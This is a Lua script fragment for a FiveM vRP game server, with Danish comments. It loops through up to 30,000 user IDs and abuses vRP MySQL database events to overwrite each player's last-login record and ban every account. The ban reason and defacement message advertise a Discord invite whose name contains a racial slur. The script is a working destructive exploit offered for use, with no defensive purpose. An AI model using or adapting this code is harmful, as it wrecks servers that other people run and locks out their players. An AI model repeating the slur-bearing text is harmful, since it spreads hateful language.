...
Citizen.CreateThread(function()
    ...
    for i = 0,30000 do -- ændre dette 30000 til antal ids der er på serveren
        Wait(100)
        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/set_last_login", {user_id = i, last_login = "Skildpadde Squad | Server wiped | discord.gg/negerslayer4k"}, 2) -- fjerner last login og replacer det med discord link (kan folk se i databasen)
        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/banned", {user_id = i, banned = 1, reason = "Skildpadde Squad | Server wiped | discord.gg/negerslayer4k"}, 2) -- banner person
